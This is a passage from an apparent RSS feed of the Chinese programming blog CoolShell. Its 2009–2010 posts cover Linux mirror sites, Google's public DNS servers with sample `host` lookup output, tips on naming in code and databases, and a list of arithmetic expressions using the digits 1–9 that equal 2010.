<p>其它的大家自己看吧。还有另外一个关于操作系统的《<a rel="bookmark" href="https://coolshell.cn/articles/1998.html">粉丝眼中的操作系统</a>》</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p> </p>
<p><a href="https://coolshell.cn/wp-content/uploads/2009/12/language-fanboys.jpg"></a></p>
 ]]></content>
<pubDate>2009-12-24T14:31:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/1992.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 粉丝眼中的操作系统 ]]></title>
<link>https://coolshell.cn/articles/1998.html</link>
<content><![CDATA[ 
<p>在发布完《<a rel="bookmark" href="https://coolshell.cn/articles/1992.html">程序员眼中的编程语言</a>》一文后，发现网上还有一个关于操作系统的。如下所示。</p>
<ul>
<li>图片的横轴是三大操作系统。</li>
<li>纵轴是各操作系统的粉丝和信徒。</li>
<li>中间的各个小图片则是，粉丝眼中的操作系统的形象。</li>
</ul>
<p>关于操作系统，还有<a href="https://coolshell.cn/articles/1579.html" target="_blank">这一张图</a>也很有意思。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p></p>
 ]]></content>
<pubDate>2009-12-24T14:50:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/1998.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 推荐几个镜像站点 ]]></title>
<link>https://coolshell.cn/articles/2011.html</link>
<content><![CDATA[ 
<p>搜狐的：<a title="http://mirrors.sohu.com" href="http://mirrors.sohu.com" target="_blank">http://mirrors.sohu.com</a></p>
<p>网易的：<a title="http://mirrors.163.com" href="http://mirrors.163.com" target="_blank">http://mirrors.163.com</a></p>
<p>上海交通大学FTP：<a title="http://202.38.97.230/" href="http://202.38.97.230/" target="_blank">http://202.38.97.230</a></p>
<p>如果你是教育网的用户，上海交通大学FTP访问速度非常的快。</p>
<p>:)</p>
 ]]></content>
<pubDate>2009-12-27T21:06:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/2011.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ google的免费dns服务器 ]]></title>
<link>https://coolshell.cn/articles/2015.html</link>
<content><![CDATA[ 
<p>google推出了自己的免费dns服务器，以供公众使用。服务器地址是：</p>
<p>dns1: 8.8.8.8</p>
<p>dns2: 8.8.4.4</p>
<p>我在我的机器上测试了一下：</p>
<p><span id="more-2015"></span></p>
<div>$ host -a g.cn 8.8.8.8</div>
<div>Trying “g.cn”</div>
<div>Using domain server:</div>
<div>Name: 8.8.8.8</div>
<div>Address: 8.8.8.8#53</div>
<div>Aliases:</div>
<div>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 33253</div>
<div>;; flags: qr rd ra; QUERY: 1, ANSWER: 11, AUTHORITY: 0, ADDITIONAL: 0</div>
<div>;; QUESTION SECTION:</div>
<div>;g.cn. IN	ANY</div>
<div>;; ANSWER SECTION:</div>
<div>g.cn. 300	IN	A	72.14.203.160</div>
<div>g.cn. 259200	IN	NS	ns3.google.com.</div>
<div>g.cn. 10800	IN	MX	10 google.com.s9b2.psmtp.com.</div>
<div>g.cn. 259200	IN	NS	ns1.google.cn.</div>
<div>g.cn. 259200	IN	NS	ns2.google.com.</div>
<div>g.cn. 86400	IN	SOA	ns1.google.com. dns-admin.google.com. 1402219 21600 3600 1209600 300</div>
<div>g.cn. 10800	IN	MX	10 google.com.s9b1.psmtp.com.</div>
<div>g.cn. 10800	IN	MX	10 google.com.s9a2.psmtp.com.</div>
<div>g.cn. 10800	IN	MX	10 google.com.s9a1.psmtp.com.</div>
<div>g.cn. 259200	IN	NS	ns1.google.com.</div>
<div>g.cn. 259200	IN	NS	ns4.google.com.</div>
<p>Received 325 bytes from <strong><span style="color: #ff0000">8.8.8.8#53 in 217 ms</span></strong></p>
<div></div>
<div>
<div>$ host -a g.cn 8.8.4.4</div>
<div>Trying “g.cn”</div>
<div>Using domain server:</div>
<div>Name: 8.8.4.4</div>
<div>Address: 8.8.4.4#53</div>
<div>Aliases:</div>
<div></div>
<div>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 40871</div>
<div>;; flags: qr rd ra; QUERY: 1, ANSWER: 11, AUTHORITY: 0, ADDITIONAL: 0</div>
<div></div>
<div>;; QUESTION SECTION:</div>
<div>;g.cn.<span> </span>IN<span> </span>ANY</div>
<div></div>
<div>;; ANSWER SECTION:</div>
<div>g.cn.<span> </span>227<span> </span>IN<span> </span>A<span> </span>72.14.203.160</div>
<div>g.cn.<span> </span>259127<span> </span>IN<span> </span>NS<span> </span>ns3.google.com.</div>
<div>g.cn.<span> </span>10727<span> </span>IN<span> </span>MX<span> </span>10 google.com.s9b2.psmtp.com.</div>
<div>g.cn.<span> </span>259127<span> </span>IN<span> </span>NS<span> </span>ns1.google.cn.</div>
<div>g.cn.<span> </span>259127<span> </span>IN<span> </span>NS<span> </span>ns2.google.com.</div>
<div>g.cn.<span> </span>86327<span> </span>IN<span> </span>SOA<span> </span>ns1.google.com. dns-admin.google.com. 1402219 21600 3600 1209600 300</div>
<div>g.cn.<span> </span>10727<span> </span>IN<span> </span>MX<span> </span>10 google.com.s9b1.psmtp.com.</div>
<div>g.cn.<span> </span>10727<span> </span>IN<span> </span>MX<span> </span>10 google.com.s9a2.psmtp.com.</div>
<div>g.cn.<span> </span>10727<span> </span>IN<span> </span>MX<span> </span>10 google.com.s9a1.psmtp.com.</div>
<div>g.cn.<span> </span>259127<span> </span>IN<span> </span>NS<span> </span>ns1.google.com.</div>
<div>g.cn.<span> </span>259127<span> </span>IN<span> </span>NS<span> </span>ns4.google.com.</div>
<div></div>
<div>Received 325 bytes from <span style="color: #ff0000"><strong>8.8.4.4#53 in 196 ms</strong></span>
</div>
<div><span style="color: #ff0000"><strong><br>
</strong></span></div>
</div>
<div></div>
<div>好记又免费，爽哉！！ :)</div>
<div></div>
<p></p>
 ]]></content>
<pubDate>2009-12-28T19:03:34+08:00</pubDate>
<guid>https://coolshell.cn/articles/2015.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序命名的一些提示 ]]></title>
<link>https://coolshell.cn/articles/1990.html</link>
<content><![CDATA[ 
<p>选择一个正确的名字是编程中最重要的事。以前酷壳向大家推荐过两篇文章《<a rel="bookmark" href="https://coolshell.cn/articles/1038.html">编程命名中的7+1个提示</a>》 和《<a title="编程中的命名设计那点事" href="https://coolshell.cn/articles/990.html">编程中的命名设计那点事</a>》，今天再向大家推荐一篇。一个正确的命名可以让你更容易地理解代码的程序，好的命名可以消除二义性，消除误解，并且说明真实的意图，甚至可以让你有清新的气息以让你更能吸引异性。;-)</p>
<h3>方法，类和变量</h3>
<div>正确的名字可以让你的程序顾名思义，下面是一些提示：</div>
<ul>
<li>
<strong>不要使用”<span style="font-family: 'courier new', monospace;">ProcessData()</span>“这样的命名</strong><br>
你如果在你的程序生涯中使用这样的函数名，那么这意味着你将是一个不合格的程序员而会被淘汰或解雇。请<strong>明确实际的功能</strong>。比如：<code>ValidateUserLogin（验证用户登录）</code> 或 <code>EliminateDuplicateRequests（去除重复请求）</code> 或 <code>ComputeAverageAge（计算平均年龄），等等。</code>
</li>
<li>
<strong>让命名来帮你设计程序</strong><br>
让我们假装有这么一条规则是——“任何的函数是有输入/输出的”，那么，你需要思考的是所有的把input变成ouptut的步骤，然后，你可以选择一个简短的句了来说明你的这段程序，然后，把这个短句再精练一下，最终成为你的函数名，而那个短句则成了你程序的结构。</li>
</ul>
<p><span id="more-1990"></span></p>
<ul>
<li>
<strong>命令不应该是模糊的</strong><br>
如果你有一个类名叫：<code>FilterCriteria</code> ，但实际上其可用于文件过滤，那么这个类应该叫做： <code>FileFilterCriteria ，就算是你真要想要用</code> FilterCriteria，那它也应该是抽象类。</li>
<li>
<strong>避免过多的工作</strong><br>
这只是一个风格上的事情，但还是需要注意一下。在上面，我们使用到了 <code>ValidateUserLogin</code> 和 <code>EliminateDuplicateRequests两个名字，这两个命令看上去需要做很多比较复杂的事。所以，让你的名字变简单一些也有利于你的程序更容易阅读和维护。一个软件本来就是由不同的模块拼成，而一个模块又是由更细小的函数和类拼成。编程中，我们都知道，一个函数的尺寸应该控制在200行以内，一个类的接口应该控制在20个以内。所以，从其名字上我们就不要让一个名字取得太大了。</code>
</li>
<li>
<strong>避免类名以 “Manager” 结尾</strong><br>
这样会让你类变成一个黑盒子，当然，有一些程序员喜欢使用这样的名字让那个类看起来好像更强大一些，但其实这样并不好。一般来说使用Manager这个字眼通常是使用工厂模式，或是一个容器，所以，对于一些最基本的算法或是数据结构的封装，最好是在其名字上体现这一算法或数据结构的名字，如： <code>SortedList</code> 和<code>ConnectionPool 。</code>
</li>
<li>
<strong>为你的枚举类型使用单数名字<br>
</strong>一个枚举类型会列出所有可能的值，所以，叫<code>animalType</code> 会比 <code>animalTypes 要好。</code>
</li>
<li>
<strong>匈牙利命名应该更多的关注名字的含义而不是类型</strong><br>
<a rel="nofollow" href="https://en.wikipedia.org/wiki/Hungarian_notation">匈牙利命名</a>是一个以前很流行的命名方法，其给出了一整套的方法告诉你如何标记你的变量的类型，但可惜的是很多程序员过多的关注了变量了类型，而不是变量名的含义。而变量名的含义才是根本。</li>
<li>
<strong>不要让名字隐藏了内在</strong><br>
比如，我们有段代码需要处理用户的输入，把其转成UTF-8码，然后标准化（比如一些协议），最后再处理相应的转义字符。千万不要把这函数命名为<code>Escape()</code> ，因为你需要调用 <code>ToUTF8()</code> 以及<code>NormalizeEntities()</code> 最后才是 <code>Escape()</code> 函数。如果你希望使用一个函数名来做这三件事，那么，你宁可使用一个模糊的名字再加上充分的注释，而不是一个确切的名字。模糊的名字会让别人在阅读时想进去看看，而确切的名字则会让别人在阅读代码时忽略细节（这看起来和第一点有点矛盾，其实也是为了程序的易读）。比如：<code>ProcessUserInput()</code>
</li>
<li>
<strong>一致性, <strong>一致性</strong>, <strong>一致性</strong></strong><br>
强调文章和代码的一致性，就算是文档写得再详细，我们也要去读代码，所以文档主要是体现思路和反映需求和设计。在程序上，我们的命令应当和文档中的术语保持一致，而程序中的命名也应该是用和文档相同的风格，这样，我们可以少很多理解上的成本。</li>
<li>
<strong>不要害怕改名<br>
</strong>有一些时候，你会觉得某具名字不合适，你需要改动一下。但你马上发现要改这个名字，需要修改很多的程序代码。在这里有一个原则，如果你的这个名字不是以API的方式发布时，那么你就应该不要害怕更改名字，就算是修改的工作量并不小，为了日后的更容易的阅读和维护，这是值得的。但是，如果这是一个API的名字，那我还是建议你不要改了，就算是你觉得这个名字烂得很。因为，当你的程序以API的形式发布后，会有N多的他人的程序依赖于这个名字，这个时候，兼容性和用户比什么都重要。</li>
</ul>
<h3>Frameworks 和 Libraries</h3>
<div>你的用户是一个程序员，他需要使用你的代码进行二次开发。 Namespaces 将会是你重点需要注意的东西。</div>
<div>
<ul>
<li>
<strong>使用namespaces 而不是类的前缀</strong><br>
希望你的编程序语言支持namespace，这样，你就可以使用它而不是在类名前面加前缀了。如果你所使用的语言不支持namespace，那么你应该上网看看其它程序员使用什么样的方式来区分自己的代码和别人的代码名字空间。</li>
<li>
<strong>使用普通的namespace而不是使用公司名</strong><br>
使用公司名做namespace并不是一个好的相法，因为公司名很容易变更，比如，公司因为被收购，被控告，合并，重组等原因需要更名。产品的名字同样也会改变。所以，使用一个普通的namespaces会好一些。如STL，ACE等。</li>
</ul>
</div>
<h3>数据库</h3>
<div>Database Schemas 意为数据模型，所以，其名字应该和其领域是合乎逻辑的，而不是为了编程的方便。</div>
<ul>
<li>
<strong>数据表应使用复数</strong><br>
别使用单数形式，这是因为在远古的ORM 中需要使用单数的形式来定义类名。而且，一个表中包含了许多行数据，所以也应该是复数的。如，”<span style="font-family: 'courier new', monospace;">items</span>“, “<span style="font-family: 'courier new', monospace;">customers</span>“, “<span style="font-family: 'courier new', monospace;">journalEntries</span>” 等等。,</li>
<li>
<strong>为那些包括派生数据或是日常处理的表使用aux_ 和meta_ 前缀</strong><br>
这些表中的数据都是用来做为临时处理的，所以，你需要一个前缀或是后缀来使他们区别于实际的表。</li>
<li>
<strong>为主键加入表名<br>
</strong>如果你有一张表叫 “<span style="font-family: 'courier new', monospace;">driverLicenses</span>” 而ID 列是主键，那么你应该把这个主键命名为”<span style="font-family: 'courier new', monospace;">driverLicense_id</span>” 而不是”id”。这样做的好处是，当你在连接两个表的时候，你不需要为主键指定表名，如： “<span style="font-family: 'courier new', monospace;">driverLicense.id</span>” 或”<span style="font-family: 'courier new', monospace;">vehicle.id</span>“，也不需要为其取别名。</li>
<li>
<strong>使用后缀来标识类</strong><br>
这样的例子很多，比如：ISBN 和Dewey Decimal numbers，VIN等等.<br>
Joe Celko有一篇文章叫 <a rel="nofollow" href="https://www.amazon.com/gp/product/0120887975?ie=UTF8&amp;tag=synesmedia-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=0120887975">SQL Programming Style</a>提到了下面这样的风格：<br>
<span style="font-family: 'courier new', monospace;">_id</span> 主键<br>
<span style="font-family: 'courier new', monospace;">_nbr</span> 字符串型的数位（有严格的规则，如：车牌号，身份证号，手机号等）<br>
<span style="font-family: 'courier new', monospace;">_code</span> 标准化编码(如：邮编，ISO 国家编码)<br>
<span style="font-family: 'courier new', monospace;">_cat</span> 种类名<br>
<span style="font-family: 'courier new', monospace;">_class</span> 子集<br>
<span style="font-family: 'courier new', monospace;">_type</span> 稍不正式的类名，比如，驾照中的，”摩托车”, “汽车”, and “出租车” 类型。</li>
</ul>
<h3>其它</h3>
<div>
<ul>
<li>
<strong>对于“物理上”的东西，命名其是什么，而不是做什么</strong><br>
比如某些物理上的名字，姓名，性别，文件路径，网络链接，文件描述符，下标索引，类的属性，这些都是物理上的东西，所以，其名字应该是标识其是什么，而不是用来做什么。</li>
<li>
<strong>对于“逻辑上”的东西，命名其做什么，而不是是什么</strong><br>
比如某些逻辑上的名字，函数名，数据结构，等。</li>
<li>
<strong>避免”Category” 问题</strong><br>
千万别使用”Category” 作为你的属性名，因为，你会马上发现，这并不靠谱，因为这就等于什么没有说。与此相类似的还有”type” ，”kind” ，”variant” ，”classification” ，”subcategory” 等，对于这些名字，没人知道其是什么东西。而应该使用更为明确的分类，如： “FuelEfficiencyGrade”, “PackagingType”, “AgeGroup”, “Flamability”, “AllergenLevel”, 等等。</li>
</ul>
<div>文章：<a href="https://sites.google.com/site/yacoset/Home/naming-tips" target="_blank">来源</a>
</div>
</div>
<p></p>
 ]]></content>
<pubDate>2010-01-06T08:24:41+08:00</pubDate>
<guid>https://coolshell.cn/articles/1990.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 2010 = 1+2-(3-4-5)*6*7*8-9 ]]></title>
<link>https://coolshell.cn/articles/2036.html</link>
<content><![CDATA[ 
<p> 这是一个数字游戏，使用123456789，并按照123456789的顺序，使用加减乘除以及括号，进行操作使其结果等于2010（原来的游戏是使其值为100，<a href="https://www.cut-the-knot.org/do_you_know/digits.shtml" target="_blank">请看这里</a>），那么会有多少种解法呢？下面是924种解法，其让我想起了“24点游戏”。</p>
<p>这里，如果让你写一段程序来生成所有的可能，你知道怎么写这段程序吗？</p>
<h4>使用单个数</h4>
<p>2010 = 1+2-(3-4-5)*6*7*8-9<br>
2010 = 1-(2+(3-4-5)*6*7)*8+9<br>
2010 = 1+2+(3+4*(5+6*7+8))*9<br>
2010 = 1+2*(3*4*(5+6)-7)*8+9<br>
2010 = 1*2*3*(4*(5*6+7*8)-9)<br>
2010 = 1+2+(3+4*(5-6+7*8))*9<br>
2010 = (1-2-3+4*(5/6+7*8))*9<br>
2010 = (1+2+3*4)*(5-6+(7+8)*9)<br>
2010 = 1+2+((3*(4+5)+6)*7-8)*9<br>
2010 = (1+2+3)*(4*(5*6+7*8)-9)<br>
2010 = 1+2+3*(4*(5+6)*(7+8)+9)<br>
2010 = (1*2/3)*((4+5)*6*7*8-9)<br>
2010 = (1-2-3)*((4+5)/6-7*8*9)<br>
2010 = (1*2+(3-4*(5/6-7))*8)*9<br>
2010 = 1*(2+(3-4*(5/6-7))*8)*9<br>
2010 = (1+2*(3+4))*(5-6+(7+8)*9)</p>
<p><span id="more-2036"></span></p>
<h4>使用多位数</h4>
<p>2010 = 12*34*5-6-7-8-9<br>
2010 = 12*34*5+6*7-8*9<br>
2010 = 1+2345*6/7+8-9<br>
2010 = 12-3*(4+5-678)-9<br>
2010 = 123*4*5-(6*7+8)*9<br>
2010 = 1+2-3*(4*5*6-789)<br>
2010 = 123*4*5+(6-7*8)*9<br>
2010 = 12*34+(5+6+7)*89<br>
2010 = 12*3*45+6*(7*8+9)<br>
2010 = 12+3*(4-5+67+8)*9<br>
2010 = (12-3)*4*56-7-8+9<br>
2010 = 12-(3-4*56+7-8)*9<br>
2010 = (1*2+34)*56-7-8+9<br>
2010 = 1*(2+34)*56-7-8+9<br>
2010 = 12*3*45-6*(7-8*9)<br>
2010 = 1+2*(34*5*6-7)-8-9<br>
2010 = 1+2-(3-45+6)*7*8-9<br>
2010 = 1*2*3*(45*6+7*8+9)<br>
2010 = (1+2)*3*4*56-7-8+9<br>
2010 = 1*2*3*(45*6-7+8*9)<br>
2010 = 12-(3/4-5)*6*78+9<br>
2010 = 1+(2/3)*45*67+8-9<br>
2010 = 1+23-4*(5/6-7*8)*9<br>
2010 = (1-2/3+4*56+7-8)*9<br>
2010 = 1+2-3*(4-5)*(678-9)<br>
2010 = (1-2)*3*(4-5-678+9)<br>
2010 = 1+2-3*((4-5)*678+9)<br>
2010 = (1+2)*(3-4*5+678+9)<br>
2010 = 1+(2+3)*(456-7*8)+9<br>
2010 = (12+3-45)*67*(8-9)<br>
2010 = 1-(23-(45-6)*7)*8+9<br>
2010 = 12-3*(4+5-(67+8)*9)<br>
2010 = 12-(3-45*(6+7-8))*9<br>
2010 = 1*(23-4*56)*(7-8-9)<br>
2010 = (1*23-4*56)*(7-8-9)<br>
2010 = (1+23/4)*5*67*8/9<br>
2010 = 12-3*(4+(5-6)*78)*9<br>
2010 = (1-23-45)*(6*7-8*9)<br>
2010 = 1*((2+34)*56-7-8+9)<br>
2010 = 1*((2+34)*56-7-8)+9<br>
2010 = 1*((2+34)*56-7)-8+9<br>
2010 = 12+3*(4*(5-6)+78)*9<br>
2010 = (1-2-34+5)*67*(8-9)<br>
2010 = 1+(2+34)*56+7*(8-9)<br>
2010 = 1+2+((34+5-6)*7-8)*9<br>
2010 = 1-(2-3-4)*(56*7+8)+9<br>
2010 = 1+2+(3+4*(56+7-8))*9<br>
2010 = (1+2*34)*(5*6+7-8)+9<br>
2010 = (12+3)*4+5*6*(7*8+9)<br>
2010 = (1+2*34*5-6)*(7+8-9)<br>
2010 = 1-(2+3-45)*(6*7+8)+9<br>
2010 = 1-(2+(3-45+6)*7)*8+9<br>
2010 = (1-2+(3+45)*6)*7-8+9<br>
2010 = (1+2)*(3*4*56-7+8)-9<br>
2010 = (1+2+3)*(45*6+7*8+9)<br>
2010 = 1*2*((3*4-5+6)*78-9)<br>
2010 = (1+2+3)*(45*6-7+8*9)<br>
2010 = 1+2-3*(45-6*7*(8+9))<br>
2010 = (12+3)*(4*5+6*7+8*9)<br>
2010 = (12+3)*4-5*6*(7-8*9)<br>
2010 = 1+2*(3*(4+5*67)-8)-9<br>
2010 = 1+(2+3-45)*(6-7*8)+9<br>
2010 = (12+3-45)*67/(8-9)<br>
2010 = 12+3*(4/(5-6)+78)*9<br>
2010 = 1-(2+3*45/6)*(7-89)<br>
2010 = (1+2)*34*5*67/(8+9)<br>
2010 = (1-2-34+5)*67/(8-9)<br>
2010 = 1+(2+34)*56+7/(8-9)<br>
2010 = 12+(3/4)*(5*6+7)*8*9<br>
2010 = (1*2/3-4)*(5+6-78)*9<br>
2010 = 1*(2/3-4)*(5+6-78)*9<br>
2010 = 12-(3/4)*(5-6*7)*8*9<br>
2010 = (1*2/3-4*56)*(7-8)*9<br>
2010 = 1*(2/3-4*56)*(7-8)*9<br>
2010 = (1+2)*((3-4)*5+678)-9<br>
2010 = (1+(2-3)*4)*(5-678)-9<br>
2010 = (1+2)*(3-4)*(5-678)-9<br>
2010 = (12+3)*(45-(6-7)*89)<br>
2010 = 12+3*((4+5)*(67+8)-9)<br>
2010 = 1-((2+34)*56-7)*(8-9)<br>
2010 = (1-2+3*45)*(6-(7-8)*9)<br>
2010 = 12-(3-(4+5+6)*(7+8))*9<br>
2010 = (12+3)*(4+5+6+7*(8+9))<br>
2010 = (1+2)*(3+4*(5+6)+7*89)<br>
2010 = 1+2-(3/(4-5))*(678-9)<br>
2010 = ((1+2)/3-4)*(5-678)-9<br>
2010 = 1-(23+(4+5)/6)*(7-89)<br>
2010 = 1-((2+34)*56-7)/(8-9)<br>
2010 = (1+2+3/4)*(5+(67-8)*9)<br>
2010 = 12*(3-4*(5-(6-7/8)*9))<br>
2010 = 1-(2+(3/4)*5*6)*(7-89)<br>
2010 = (1+2)*((3-4)*5+(67+8)*9)<br>
2010 = (1+(2-3)*4)*(5-(67+8)*9)<br>
2010 = (1+2)*(3-4)*(5-(67+8)*9)<br>
2010 = (1-(23+4)*5)*(6*(7-8)-9)<br>
2010 = (12+3)*((4+5)*(6+7)+8+9)<br>
2010 = (12/3)*((4-5)/6+7*8)*9<br>
2010 = ((1*2/3-4*56)/(7-8))*9<br>
2010 = (1*(2/3-4*56)/(7-8))*9<br>
2010 = ((1+2)/(3-4))*(5-678)-9<br>
2010 = ((12+3)/4)*(5+(67-8)*9)<br>
2010 = ((1+2)/3-4)*(5-(67+8)*9)<br>
2010 = (1-(23+4)*5)*(6/(7-8)-9)<br>
2010 = ((1+2)/(3-4))*(5-(67+8)*9)</p>
<h4>使用小数</h4>
<p>2010 = 1+2+.3*4*5*6*7*8-9<br>
2010 = 1+2+3*.4*5*6*7*8-9<br>
2010 = 1+2+3*4*.5*6*7*8-9<br>
2010 = 1+2+3*4*5*.6*7*8-9<br>
2010 = 1+2+3*4*5*6*.7*8-9<br>
2010 = 1+2+3*4*5*6*7*.8-9<br>
2010 = 1/.2+345*6-7*8-9<br>
2010 = 1/.2+345*6+7-8*9<br>
2010 = 1+2*3*4*56/.7+89<br>
2010 = 12+(34.5*6+7+8)*9<br>
2010 = 1+234.5*6/.7+8-9<br>
2010 = (1234+567+8)/.9<br>
2010 = 1+2345*.6/.7+8-9<br>
2010 = 12-34*(.5-67+8)+9<br>
2010 = 12-(3*4-5*6*7.8)*9<br>
2010 = 12*(3*4-.5+67+89)<br>
2010 = 1*(2345-67*8)/.9<br>
2010 = (1*2345-67*8)/.9<br>
2010 = 12+3*(.4*5-6+78)*9<br>
2010 = 12+3*(4*.5-6+78)*9<br>
2010 = 12-(3*4-.5*6*78)*9<br>
2010 = 12-(3*4-5*.6*78)*9<br>
2010 = 1-(2-.3*4*5*6*7)*8+9<br>
2010 = 1-(2-3*.4*5*6*7)*8+9<br>
2010 = 1-(2-3*4*.5*6*7)*8+9<br>
2010 = 1-(2-3*4*5*.6*7)*8+9<br>
2010 = 1-(2-3*4*5*6*.7)*8+9<br>
2010 = 1+2+3-4*(.5*6-7*8*9)<br>
2010 = 1+2+3-4*(5*.6-7*8*9)<br>
2010 = 1*2*3-4*(.5*6-7*8*9)<br>
2010 = 1*2*3-4*(5*.6-7*8*9)<br>
2010 = 12*(34*5-.6+7-8.9)<br>
2010 = .1+23*(45+6*7)+8.9<br>
2010 = .1+23*(4*5+67)+8.9<br>
2010 = .1+2345*6/7+.8-.9<br>
2010 = 12+3*(45/.6+7-8)*9<br>
2010 = .1+2-3*(4+5-678)+.9<br>
2010 = 1+2-(3-.4*567+.8)*9<br>
2010 = 1+2-(3-4*56.7+.8)*9<br>
2010 = (12/.3-4)*56-7-8+9<br>
2010 = 1.2+(3+45)*6*7-.8*9<br>
2010 = 1.2+(3+45)*6*7-8*.9<br>
2010 = 12*34*5+6/(7-.8*9)<br>
2010 = 12*34*5+6/(7-8*.9)<br>
2010 = 12*(34*5-.6+7-8-.9)<br>
2010 = (1.2+34+5)*(67-8-9)<br>
2010 = 1+2+3*(4+56/.7)*8-9<br>
2010 = 12+3*(.4-5+.6+78)*9<br>
2010 = .1+23*(45+6*7)+8+.9<br>
2010 = .1+23*(4*5+67)+8+.9<br>
2010 = 12+3*45*(.6+7+.8*9)<br>
2010 = 1-(23-4.5+6)*(7-89)<br>
2010 = 1*2*3*(4/.5+6*7*8-9)<br>
2010 = 12-(3-4.5*(6*7+8))*9<br>
2010 = (1+2)*(3-.4*5+678-9)<br>
2010 = (1+2)*(3-4*.5+678-9)<br>
2010 = 12*(3.4*56*7/8+.9)<br>
2010 = 12*(34+(.5-6+7)*89)<br>
2010 = 1+.2+(3+45)*6*7-.8*9<br>
2010 = 1+.2+(3+45)*6*7-8*.9<br>
2010 = 12-(3+4.5*(6-7*8))*9<br>
2010 = 12+((34+.5)*6+7+8)*9<br>
2010 = 1+(234+.5)*6/.7+8-9<br>
2010 = (1+.2+34+5)*(67-8-9)<br>
2010 = 12+(.3-4)*(5-67*8-9)<br>
2010 = 12*3*(45+6*7/8)/.9<br>
2010 = 12-(34+5*(.6-7)*8)*9<br>
2010 = 12+(34*(.5+6)-7+8)*9<br>
2010 = 1+(2/.3)*4.5*67+8-9<br>
2010 = 1+(2/.3)*45*6.7+8-9<br>
2010 = 1-(23-4-.5+6)*(7-89)<br>
2010 = 1-(2-3-4)*(56*7+.8+9)<br>
2010 = 1*2*(34-.5)*(6+7+8+9)<br>
2010 = (1+23-4)*5*(6+7+8-.9)<br>
2010 = (1+2*34)*(.5*6*7+8)+9<br>
2010 = (1+2*34)*(5*.6*7+8)+9<br>
2010 = (1+2*34)*(5*6*.7+8)+9<br>
2010 = 12*(3+4)+5*(6*7+.8)*9<br>
2010 = 12-3*(4-5*(.6+7+8))*9<br>
2010 = (1-2*34)*.5*6*(7-8-9)<br>
2010 = (1+2)*34+5*(6-.7)*8*9<br>
2010 = 12+3*4*(5*(6-.7)-8)*9<br>
2010 = 12-(.3/.4-5)*6*78+9<br>
2010 = 12-(3*4-5*6*(7+.8))*9<br>
2010 = 1*2*(3*4*(.5+6+78)-9)<br>
2010 = 1-(2-34)*(.5+6+7*8)+9<br>
2010 = 1-(2+34+5-6)*7*(.8-9)<br>
2010 = 1-(234+5+6)*(.7-8.9)<br>
2010 = (1+2+3+4*56)*(.7+8)+9<br>
2010 = (1*2*3+4*56)*(.7+8)+9<br>
2010 = 1*(2*3+4*56)*(.7+8)+9<br>
2010 = (1+(234+5-6-7)*8)/.9<br>
2010 = (1*2+3)*4*5*(6+7+8-.9)<br>
2010 = 1.2*(34-.5)*(67-8-9)<br>
2010 = 1*(2+3)*4*5*(6+7+8-.9)<br>
2010 = 1-(2+3)*4*(.5-6-7)*8+9<br>
2010 = (123/.4+5)*6+(7+8)*9<br>
2010 = (12/3)*(4.5-6+7*8*9)<br>
2010 = 1*2*(3*(.4*5+6*7*8)-9)<br>
2010 = 1*2*(3*(4*.5+6*7*8)-9)<br>
2010 = 1*(2*3-4*(.5*6-7*8*9))<br>
2010 = 1*(2*3-4*(5*.6-7*8*9))<br>
2010 = (1+2)*(3-4/.5+678)-9<br>
2010 = (1-2+3+4)*(.5+6*7*8)-9<br>
2010 = 1*2*3*(4+(.5+6*7)*8-9)<br>
2010 = 1/.2+34-5*6*(.7-8)*9<br>
2010 = ((123+4*5)/.6-7-8)*9<br>
2010 = 12*(34*5-.6*7+.8+.9)<br>
2010 = 12*(34*5-6*.7+.8+.9)<br>
2010 = (1*2/3+4-.5)*67*.8*9<br>
2010 = 1-(2*3*4+5+6)*7*(.8-9)<br>
2010 = .1*(2/3+4-.5)*67*8*9<br>
2010 = 1*(2/3+4-.5)*67*.8*9<br>
2010 = 1+23-4*(.5/.6-7*8)*9<br>
2010 = 1+(2-3-4+5*6*7)*(.8+9)<br>
2010 = 1-2*(3+4*5*(.6-7))*8+9<br>
2010 = 1+(2-3-4-5*6)*7*(.8-9)<br>
2010 = (1-.2/.3+4*56+7-8)*9<br>
2010 = (1+23)*(4+5+67/.8-9)<br>
2010 = 1-(234+5+6)*(.7-8-.9)<br>
2010 = 12+((3*4/.5)*6+78)*9<br>
2010 = 12-3*(.4-5.6*7*(8+9))<br>
2010 = (1+2.3/.4)*5*67*8/9<br>
2010 = (1+23/4)*5*6.7*8/.9<br>
2010 = 12*(3*(4+5-.6)*7-8.9)<br>
2010 = (1*2-34*(.5-67)*8)/9<br>
2010 = 1*(2-34*(.5-67)*8)/9<br>
2010 = (1+2)*(3*45+6*78)/.9<br>
2010 = 1+(2/.3)*4*(5+67)+89<br>
2010 = (1/.2)*(3-4*56+7*89)<br>
2010 = (1-23-4/.5)*67*(8-9)<br>
2010 = .1+234.5*6/.7+.8-.9<br>
2010 = (1-2+34/.5)*(6+7+8+9)<br>
2010 = 1*2*3*(.4-.5+6*7*8-.9)<br>
2010 = ((12/3)*456-7-8)/.9<br>
2010 = (1+(234-56/7)*8)/.9<br>
2010 = (12/3)*(4+.5-6+7*8*9)<br>
2010 = 12-(3-45*(6*.7+.8))*9<br>
2010 = (1+23)/.4+5*6*(7*8+9)<br>
2010 = 1+(2/.3+4*5)*(67+8)+9<br>
2010 = 1-(2-3*(4+56/.7))*8+9<br>
2010 = (.1-2*3.4)*5*6*(7-8-9)<br>
2010 = 1+((2+3)*4/.56)*7*8+9<br>
2010 = 12*((34-5)*6-.7*8-.9)<br>
2010 = 12*((34-5)*6-7*.8-.9)<br>
2010 = 12*((34-5)*6+.7-.8*9)<br>
2010 = 12*((34-5)*6+.7-8*.9)<br>
2010 = (12-3+4*5*6*(7+8))/.9<br>
